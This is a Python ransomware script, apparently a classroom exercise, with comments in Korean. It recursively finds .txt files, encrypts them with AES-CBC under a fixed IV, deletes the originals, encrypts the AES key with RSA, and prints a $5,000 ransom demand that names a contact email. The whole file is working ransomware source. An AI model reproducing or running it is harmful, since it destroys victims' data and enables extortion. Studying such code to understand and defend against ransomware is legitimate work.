import glob
import os, random, struct
from Cryptodome.Cipher import AES
import sys
from Crypto.Cipher import PKCS1_OAEP

from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from base64 import b64encode
from base64 import b64decode
from Crypto.Util.py3compat import *

def encrypt_file(key, in_filename, out_filename=None):#암호화하는 함수 
    if not out_filename:
        out_filename = in_filename + '.enc'#암호화한 내용을 저장할 파일은 .enc 확장자로 저장할 것이다. 
    iv = '0pXvAAg0oqRpVJHm6QgwBQ=='#iv값을 고정한다. (base64로 인코딩된 형태이다. )
    #이때, iv는 AES CBC mode에서 필요하며 복호화를 위해 꼭 필요한 값이다.
    iv = b64decode(iv)
    cipher = AES.new(key ,AES.MODE_CBC, iv)# AES로 암호화된 CBC mode을 생성하여 cipher에 저장한다. 
    
    filesize = os.path.getsize(in_filename)#암호화 대상의 파일 사이즈를 파악한다. 

    with open(in_filename, 'rb') as infile:#암호화 대상 파일을 연다. 
        with open(out_filename, 'wb') as outfile:
            data = infile.read(filesize)#암호화 대상 파일을 읽어서 data변수에 저장한다. 
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))#AES를 이용 암호화하기 위해 크기를 맞추기 위해서 패딩을 사용
            ct = b64encode(ct_bytes)# pycryptodome은 오직 bytes형만 처리할 수 있다. encode()를 이용하여 데이터를 bytes형으로 변환한다.
            outfile.write(ct)#암호화된 파일 작성 완료


def enc_key(AESKEY):#key를 RSA 알고리즘을 이용하여 암호화하는 함수이다. 
    key = RSA.generate(2048)
    private_key = key.export_key()#개인키 생성
    file_out = open("../attacker/private.pem", "wb")#개인키를 pem형태로 저장한다. 
    file_out.write(private_key)
    file_out.close()

    public_key = key.publickey().export_key()#공개키 생성
    file_out = open("./receiver.pem", "wb")#공개키를 pem형태로 저장한다. 
    file_out.write(public_key)
    file_out.close()

    f = open("./receiver.pem", 'rb')#key를 공개키를 이용하여 key.bin으로 암호화한다. 
    recipent_key = RSA.import_key(f.read())#공개키를 불러온다. 
    file_out = open("./key.bin", "wb")#암호화된 결과를 저장할 key.bin 파일을 생성한다. 
    cipher_rsa = PKCS1_OAEP.new(recipent_key)#PKCS1_OAEP를 이용하여 암호화한다. 
    enc_data = cipher_rsa.encrypt(AESKEY)
    file_out.write(enc_data)#암호화된 데이터를 작성한다. 
    file_out.close()

def main():
    key = get_random_bytes(16)#랜덤하게 128비트 대칭키를 생성한다. 
    startPath = './**' #피해자의 랜섬웨어가 있는 파일 내에 모든 것들 중 파일을 가져와야 하므로 랜섬웨어 있는 경로를 의미한다. 
#glob를 활용하여 동일하게 데이터위치에서 .enc로 끝나는 모든 파일명을 가져올 수 있다 .
    for filename in glob.iglob(startPath, recursive=True):#startPath폴더 내에 있는 파일들을 재귀적으로 호출한다 
        if(os.path.isfile(filename)):#파일일 경우 
            fname, ext = os.path.splitext(filename)#파일 이름과 확장자를 분리하여 변수에 각각 저장한다. 
            if (ext == '.txt'):#확장자가 txt인 것만 찾아서 암호화를 한다. 
                encrypt_file(key, filename)
                os.remove(filename)#.txt 파일(원본 파일)을 삭제한다 
    print("Your text files are encrypted.")#암호화를 마치고 다음의 문장을 커맨드라인에 출력한다. 
    print("To decrypt them, you need to pay me $5,000 and send key.bin in your folder to ziyun1612@ewhain.net")
    enc_key(key)#사용한 key를 암호화한다. 

main()#main 함수 실행시킨다. 
    
    


	





	
